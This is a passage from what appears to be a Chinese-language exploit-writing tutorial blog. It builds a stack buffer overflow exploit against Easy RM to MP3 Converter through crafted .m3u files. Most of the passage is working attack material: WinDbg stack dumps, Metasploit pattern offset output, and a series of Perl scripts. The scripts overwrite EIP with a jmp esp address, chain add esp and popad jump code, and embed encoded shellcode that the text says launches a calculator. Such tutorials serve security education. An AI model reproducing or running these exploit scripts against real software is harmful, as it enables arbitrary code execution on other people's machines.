AAAAAAAAAAAAAAAA000ffe98  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA000ffea8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA0:000&gt; d000ffeb8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA000ffec8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA000ffed8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA000ffee8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA000ffef8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA000fff08  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA000fff18  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA000fff28  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA0:000&gt; d000fff38  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA000fff48  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA000fff58  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA000fff68  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA000fff78  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA000fff88  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA000fff98  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA000fffa8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA0:000&gt; d000fffb8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA000fffc8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA000fffd8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA000fffe8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA000ffff8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA00100008  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA00100018  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA00100028  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA0:000&gt; d00100038  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA</code></pre><p>现在我们如果想要往字符‘A’的地址放置我们的shellcode的话需要确定ESP+281处的字符‘A’位于我们写入的26067个‘A’的具体位置，这样我们才可以将shellcode防止合适的位置</p><ul><li>用pattern_create.rb工具来生成1000个字节的字符模型来替换A的前1000个字节。</li></ul><pre><code>kali@kali:/usr/share/metasploit-framework/tools/exploit$ ./pattern_create.rb -l 1000Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bkali@kali:/usr/share/metasploit-framework/tools/exploit$ </code></pre><p>编写perl脚本，生成测试文件</p><pre><code class="perl">my $file= "blind_return_2.m3u";my $pattern = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B";my $junk= "A" x 25067;my $eip = "BBBB";my $preshellcode = "X" x 54; #let's pretend this is the only space we have available at ESPmy $nop = "\x90" x 230; #added some nops to visually separate our 54 X's from other data in the ESP dumpopen($FILE,"&gt;$file");print $FILE $pattern.$junk.$eip.$preshellcode.$nop;close($FILE);print "m3u File Created successfully\n";</code></pre><p>用Easy RM to MP3打开测试文件</p><pre><code>eax=00000001 ebx=00104a58 ecx=7c93003d edx=00000004 esi=77c2fce0 edi=000066f3eip=42424242 esp=000ffd38 ebp=00104678 iopl=0         nv up ei pl nz ac pe nccs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=0000021642424242 ??              ???0:000&gt; d esp000ffd38  58 58 58 58 58 58 58 58-58 58 58 58 58 58 58 58  XXXXXXXXXXXXXXXX000ffd48  58 58 58 58 58 58 58 58-58 58 58 58 58 58 58 58  XXXXXXXXXXXXXXXX000ffd58  58 58 58 58 58 58 58 58-58 58 58 58 58 58 58 58  XXXXXXXXXXXXXXXX000ffd68  58 58 90 90 90 90 90 90-90 90 90 90 90 90 90 90  XX..............000ffd78  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................000ffd88  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................000ffd98  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................000ffda8  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................0:000&gt; d000ffdb8  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................000ffdc8  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................000ffdd8  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................000ffde8  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................000ffdf8  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................000ffe08  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................000ffe18  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................000ffe28  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................0:000&gt; d000ffe38  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................000ffe48  90 90 90 90 90 90 90 90-00 35 41 69 36 41 69 37  .........5Ai6Ai7000ffe58  41 69 38 41 69 39 41 6a-30 41 6a 31 41 6a 32 41  Ai8Ai9Aj0Aj1Aj2A000ffe68  6a 33 41 6a 34 41 6a 35-41 6a 36 41 6a 37 41 6a  j3Aj4Aj5Aj6Aj7Aj000ffe78  38 41 6a 39 41 6b 30 41-6b 31 41 6b 32 41 6b 33  8Aj9Ak0Ak1Ak2Ak3000ffe88  41 6b 34 41 6b 35 41 6b-36 41 6b 37 41 6b 38 41  Ak4Ak5Ak6Ak7Ak8A000ffe98  6b 39 41 6c 30 41 6c 31-41 6c 32 41 6c 33 41 6c  k9Al0Al1Al2Al3Al000ffea8  34 41 6c 35 41 6c 36 41-6c 37 41 6c 38 41 6c 39  4Al5Al6Al7Al8Al90:000&gt; d000ffeb8  41 6d 30 41 6d 31 41 6d-32 41 6d 33 41 6d 34 41  Am0Am1Am2Am3Am4A000ffec8  6d 35 41 6d 36 41 6d 37-41 6d 38 41 6d 39 41 6e  m5Am6Am7Am8Am9An000ffed8  30 41 6e 31 41 6e 32 41-6e 33 41 6e 34 41 6e 35  0An1An2An3An4An5000ffee8  41 6e 36 41 6e 37 41 6e-38 41 6e 39 41 6f 30 41  An6An7An8An9Ao0A000ffef8  6f 31 41 6f 32 41 6f 33-41 6f 34 41 6f 35 41 6f  o1Ao2Ao3Ao4Ao5Ao000fff08  36 41 6f 37 41 6f 38 41-6f 39 41 70 30 41 70 31  6Ao7Ao8Ao9Ap0Ap1000fff18  41 70 32 41 70 33 41 70-34 41 70 35 41 70 36 41  Ap2Ap3Ap4Ap5Ap6A000fff28  70 37 41 70 38 41 70 39-41 71 30 41 71 31 41 71  p7Ap8Ap9Aq0Aq1Aq</code></pre><p>可以看到模式字符串从5Ai6开始，借助pattern_offset.rb工具来定位一下5Ai6在模式字符串中的位置</p><pre><code>kali@kali:/usr/share/metasploit-framework/tools/exploit$ ./pattern_offset.rb -q 5Ai6[*] Exact match at offset 257kali@kali:/usr/share/metasploit-framework/tools/exploit$ </code></pre><p>可以看到这4个字符的偏移量为257，这下我们可以设计我们要放置shellcode的位置，将文件的前257个字节放置不影响shellcode执行的字符，之后加上我们的shellcode然后剩余的字节还是填充为A。</p><p>编写perl脚本查看一下内存是否如我们所想的一样</p><pre><code class="perl">my $file= "blind_return_3.m3u";my $buffersize = 26067;my $junk= "A" x 250;my $nop = "\x90" x50;#250个字节的A加上一些不影响执行的nop（在内存空间足够用的时候在计算的shellcode地址之前填充一些nop指令可以让我们的shellcode适应性更强一点）my $shellcode = "\xcc";my $restofbuffer = "A" x ($buffersize - (length($junk) + length($nop) + length($shellcode)));my $eip = "BBBB";my $preshellcode = "X" x 54; #let's pretend this is the only space we have available at ESPmy $nop2 = "\x90" x 230; #added some nops to visually separate our 54 X's from other data in the ESP dumpopen($FILE,"&gt;$file");print $FILE $junk.$nop.$shellcode.$restofbuffer.$eip.$preshellcode.$nop2;close($FILE);</code></pre><img src="/2021/05/20/exploit%E7%BC%96%E5%86%99%E7%B3%BB%E5%88%972%EF%BC%9A%E6%A0%88%E6%BA%A2%E5%87%BA%EF%BC%8C%E8%B7%B3%E8%BD%AC%E8%87%B3shellcode/image-20210113231801856-1621477705987.png" class="" title="image-20210113231801856"><p>当程序中断后我们可以看到，NOP起始于0x000ffe51,后面是我们的shellcode（0xCC)，再之后是一串A字符。</p><p><em><strong>接下来我们需要在ESP（上图中X的地址）中放入jmpshellcode指令</strong></em>，来帮助我们跳转到ESP+281的位置。</p><p>所以我们需要在内存中寻找指令将ESP+281（或者可以稍大一点，因为我们在shellcode前放置了NOP串，这可以使shellcode的设计具有一定的灵活性）然后再使用jmp esp指令跳转到我们shellcode的位置。</p><p>这里我们可以寻找三个<code>add esp,0x50e</code>指令，0x5e * 3 = 11Ah &gt; 281(119h)，然后再寻找一个jmp esp指令就构成了我们的jmpshellcode了。</p><pre><code>0:010&gt; a7c92120e add esp,0x5eadd esp,0x5e7c921211 add esp,0x5eadd esp,0x5e7c921214 add esp,0x5eadd esp,0x5e7c921217 jmp espjmp esp7c921219 0:010&gt; u 7c92120e ntdll!DbgBreakPoint:7c92120e 83c45e          add     esp,5Eh7c921211 83c45e          add     esp,5Eh7c921214 83c45e          add     esp,5Eh7c921217 ffe4            jmp     esp7c921219 04cc            add     al,0CCh7c92121b c20400          ret     4ntdll!NtCurrentTeb:7c92121e 64a118000000    mov     eax,dword ptr fs:[00000018h]7c921224 c3              ret</code></pre><p>从上面我们可以知道jumpcode的机器码为：0x83,0xc4,0x5e,0x83,0xc4,0x5e,0x83,0xc4,0x5e,0xff,0xe4</p><p>然后我们可以根据前面测试得到的一些信息来修改一下我们的exp，然后运行测试一下jmpcode是否可以覆盖ESP的位置</p><pre><code class="perl">my $file= "blind_return_4.m3u";my $buffersize = 26067;my $junk= "A" x 250;my $nop = "\x90" x 50;my $shellcode = "\xcc"; #position 300my $restofbuffer = "A" x ($buffersize-(length($junk)+length($nop)+length($shellcode)));my $eip = "BBBB";my $preshellcode = "X" x 4;my $jumpcode = "\x83\xc4\x5e" . #add esp,0x5e"\x83\xc4\x5e" . #add esp,0x5e"\x83\xc4\x5e" . #add esp,0x5e"\xff\xe4"; #jmp espmy $nop2 = "0x90" x 10; # only used to visually separatemy $buffer = $junk.$nop.$shellcode.$restofbuffer;print "Size of buffer : ".length($buffer)."\n";open($FILE,"&gt;$file");print $FILE $buffer.$eip.$preshellcode.$jumpcode;close($FILE);print "m3u File Created successfully\n";</code></pre><img src="/2021/05/20/exploit%E7%BC%96%E5%86%99%E7%B3%BB%E5%88%972%EF%BC%9A%E6%A0%88%E6%BA%A2%E5%87%BA%EF%BC%8C%E8%B7%B3%E8%BD%AC%E8%87%B3shellcode/image-20210129232150356-1621477705987.png" class="" title="image-20210129232150356"><p>从图中我们可以看到，esp已经被我们的jmpcode覆盖，执行jmpcode后，ESP将会指向0xFFE50~0xFFE7B之间的地址</p><p>这样的话，最后我们就只需要将ESP修改为jmp esp指令的地址，来让EIP先指向我们的jmpcode处</p><p>在前面的调试中我们找到了一个符合我们要求jmp esp的地址（0x01b9f23a），直接拿来用就好。</p><p>调整shellcode布局在预定的shellcode处放置0xcc</p><pre><code class="perl">my $file= "blind_return_5.m3u";my $buffersize = 26067;my $junk= "A" x 250;my $nop = "\x90" x 50;my $shellcode = "\xcc"; #position 300my $restofbuffer = "A" x ($buffersize-(length($junk)+length($nop)+length($shellcode)));my $eip = pack('V',0x01b9f23a);my $preshellcode = "X" x 4;my $jumpcode = "\x83\xc4\x5e" . #add esp,0x5e"\x83\xc4\x5e" . #add esp,0x5e"\x83\xc4\x5e" . #add esp,0x5e"\xff\xe4"; #jmp espmy $nop2 = "0x90" x 10; # only used to visually separatemy $buffer = $junk.$nop.$shellcode.$restofbuffer;print "Size of buffer : ".length($buffer)."\n";open($FILE,"&gt;$file");print $FILE $buffer.$eip.$preshellcode.$jumpcode;close($FILE);print "m3u File Created successfully\n";</code></pre><pre><code>eax=00000001 ebx=00104a58 ecx=7c93003d edx=00aa0000 esi=77c2fce0 edi=000065e6eip=000ffe7c esp=000ffe52 ebp=00104678 iopl=0         nv up ei pl nz ac po nccs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000212000ffe7c cc              int     30:000&gt; d esp000ffe52  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................000ffe62  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................000ffe72  90 90 90 90 90 90 90 90-90 90 cc 41 41 41 41 41  ...........AAAAA000ffe82  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA000ffe92  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA000ffea2  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA000ffeb2  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA000ffec2  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA</code></pre><p>可以看到果然中断在了我们预定的地址，接下来我们就可以将0xcc替换为真正的shellcode，同时将字符’A’替换为’NOP’，之后就可以跳入更大的空间，所以只需要跳转188（2 * 5e）即可。</p><pre><code class="perl">my $file= "blind_return_6.m3u";my $buffersize = 26067;my $junk= "\x90" x 250;my $nop = "\x90" x 50;my $shellcode = "\xdb\xc0\x31\xc9\xbf\x7c\x16\x70\xcc\xd9\x74\x24\xf4\xb1" ."\x1e\x58\x31\x78\x18\x83\xe8\xfc\x03\x78\x68\xf4\x85\x30" ."\x78\xbc\x65\xc9\x78\xb6\x23\xf5\xf3\xb4\xae\x7d\x02\xaa" ."\x3a\x32\x1c\xbf\x62\xed\x1d\x54\xd5\x66\x29\x21\xe7\x96" ."\x60\xf5\x71\xca\x06\x35\xf5\x14\xc7\x7c\xfb\x1b\x05\x6b" ."\xf0\x27\xdd\x48\xfd\x22\x38\x1b\xa2\xe8\xc3\xf7\x3b\x7a" ."\xcf\x4c\x4f\x23\xd3\x53\xa4\x57\xf7\xd8\x3b\x83\x8e\x83" ."\x1f\x57\x53\x64\x51\xa1\x33\xcd\xf5\xc6\xf5\xc1\x7e\x98" ."\xf5\xaa\xf1\x05\xa8\x26\x99\x3d\x3b\xc0\xd9\xfe\x51\x61" ."\xb6\x0e\x2f\x85\x19\x87\xb7\x78\x2f\x59\x90\x7b\xd7\x05" ."\x7f\xe8\x7b\xca"; #position 300my $restofbuffer = "\x90" x ($buffersize-(length($junk)+length($nop)+length($shellcode)));my $eip = pack('V',0x01b9f23a);my $preshellcode = "X" x 4;my $jumpcode = "\x83\xc4\x5e" . #add esp,0x5e"\x83\xc4\x5e" . #add esp,0x5e#"\x83\xc4\x5e" . #add esp,0x5e"\xff\xe4"; #jmp espmy $nop2 = "0x90" x 10; # only used to visually separatemy $buffer = $junk.$nop.$shellcode.$restofbuffer;print "Size of buffer : ".length($buffer)."\n";open($FILE,"&gt;$file");print $FILE $buffer.$eip.$preshellcode.$jumpcode;close($FILE);print "m3u File Created successfully\n";</code></pre><p>成功弹出计算器</p><img src="/2021/05/20/exploit%E7%BC%96%E5%86%99%E7%B3%BB%E5%88%972%EF%BC%9A%E6%A0%88%E6%BA%A2%E5%87%BA%EF%BC%8C%E8%B7%B3%E8%BD%AC%E8%87%B3shellcode/image-20210131221051399-1621477705987.png" class="" title="image-20210131221051399"><h3 id="其它跳转方式"><a href="#其它跳转方式" class="headerlink" title="其它跳转方式"></a>其它跳转方式</h3><ul><li>popad</li><li>硬编码跳转地址</li></ul><p>“popad”指令也可以帮助我们跳转到shellcode，popad将从栈ESP中弹出DWORD数据，并赋予各通用寄存器，他按以下顺序加载各寄存器：EDI, ESI, EBP, EDX, ECX, EAX. 因此，每次加载寄存器（popad引起的）时ESP都会递增。一次popad将用掉ESP中的32字节，并以有序的方式将其pop到个寄存器中。</p><p>popad的机器码是0x61</p><p>假设你需要跳转40字节，而你只有两字节可以用于跳转，那么你可以使用两个popad指令来使ESP指向shellcode（以一串NOP指令开头以弥补我们两次跳过的32bytes - 40bytes大小的空间）。让我们再次以 Easy RM to MP3漏洞来演示这项技术：</p><p>我们还使用我们前面用的脚本来练习，伪造一个缓冲区，在ESP处填充13个“X”,然后再放置一些垃圾数据（“D”&amp;“A”）。后面接着放置我们的shellcode（NOPS  + A’s）</p><pre><code class="perl">my $file= "test1.m3u";my $buffersize = 26067;my $junk= "C" x 250;my $nop = "\x90" x 50;my $shellcode = "\xcc";my $restofbuffer = "A" x ($buffersize-(length($junk)+length($nop)+length($shellcode)));my $eip = "BBBB";my $preshellcode = "X" x 17; #let's pretend this is the only space we have availablemy $garbage = "D" x 100; #let’s pretend this is the space we need to jump overmy $buffer = $junk.$nop.$shellcode.$restofbuffer;print "Size of buffer : ".length($buffer)."\n";open($FILE,"&gt;$file");print $FILE $buffer.$eip.$preshellcode.$garbage;close($FILE);</code></pre><pre><code>eax=00000001 ebx=00104a58 ecx=7c93003d edx=00aa0000 esi=77c2fce0 edi=0000664ceip=42424242 esp=000ffd38 ebp=00104678 iopl=0         nv up ei pl nz ac pe nccs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=0000021642424242 ??              ???0:000&gt; d esp000ffd38  58 58 58 58 58 58 58 58-58 58 58 58 58 44 44 44  XXXXXXXXXXXXXDDD000ffd48  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD000ffd58  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD000ffd68  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD000ffd78  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD000ffd88  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD000ffd98  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD000ffda8  44 00 43 43 43 43 43 43-43 43 43 43 43 43 43 43  D.CCCCCCCCCCCCCC0:000&gt; d000ffdb8  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC000ffdc8  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC000ffdd8  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC000ffde8  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC000ffdf8  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC000ffe08  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC000ffe18  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC000ffe28  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC0:000&gt; d000ffe38  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC000ffe48  43 43 90 90 90 90 90 90-90 90 90 90 90 90 90 90  CC..............000ffe58  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................000ffe68  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................000ffe78  90 90 90 90 cc 41 41 41-41 41 41 41 41 41 41 41  .....AAAAAAAAAAA000ffe88  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA000ffe98  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA000ffea8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA0:000&gt; d000ffeb8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA000ffec8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA000ffed8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA</code></pre><p>假设我们需要直接在ESP中的13字节“X”里面跳过100字节“D”和160字节“A”（共260字节），末尾再放置shellcode（以NOPs开头，接着放一个”0xcc”，然后A’s（shellcode）。一个popad指令相当于从栈中弹出32字节，因此260字节 = 9 * popad’s - 28 bytes。因此，我们需要在shellcode头部的位置放置一段NOPs，或者起始于shellcode入口地址 + 28字节。至此，我们已在shellcode之前放置NOPs，现在可以尝试使用”popad”指令进入NOPs，然后看程序是否能够中断在断点处。</p><p>调整一下脚本，还用我们之前找好的 jmp esp 地址覆盖 EIP 然后用9个 popad 指令替代之前的 X‘s，之后再接上0xff 0xE4(jmp esp)。</p><pre><code class="perl">my $file= "test2.m3u";my $buffersize = 26067;my $junk= "C" x 250;my $nop = "\x90" x 50;my $shellcode = "\xcc";my $restofbuffer = "A" x ($buffersize-(length($junk)+length($nop)+length($shellcode)));my $eip = pack('V',0x01b9f23a);my $preshellcode = "X" * 4;$preshellcode = $preshellcode . "\x61" x 9;$preshellcode = $preshellcode . "\xff\xe4";$preshellcode = $preshellcode . "\x90" x 3; #let's pretend this is the only space we have availablemy $garbage = "D" x 100; #let’s pretend this is the space we need to jump overmy $buffer = $junk.$nop.$shellcode.$restofbuffer;print "Size of buffer : ".length($buffer)."\n";open($FILE,"&gt;$file");print $FILE $buffer.$eip.$preshellcode.$garbage;close($FILE);</code></pre><p>打开文件后断在了我们设置的int3断点处。查看一下当前EIP和ESP的情况：</p><pre><code>eax=43434343 ebx=43434395 ecx=43434343 edx=43434343 esi=43434343 edi=43434343eip=000ffe7c esp=000ffdf8 ebp=43434343 iopl=0         nv up ei pl nz na pe nccs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206000ffe7c cc              int     30:000&gt; d eip000ffe7c  cc 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  .AAAAAAAAAAAAAAA000ffe8c  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA000ffe9c  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA000ffeac  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA000ffebc  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA000ffecc  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA000ffedc  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA000ffeec  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA0:000&gt; d eip-32000ffe4a  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................000ffe5a  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................000ffe6a  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................000ffe7a  90 90 cc 41 41 41 41 41-41 41 41 41 41 41 41 41  ...AAAAAAAAAAAAA000ffe8a  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA000ffe9a  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA000ffeaa  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA000ffeba  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA0:000&gt; d esp000ffdf8  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC000ffe08  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC000ffe18  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC000ffe28  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC000ffe38  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC000ffe48  43 43 90 90 90 90 90 90-90 90 90 90 90 90 90 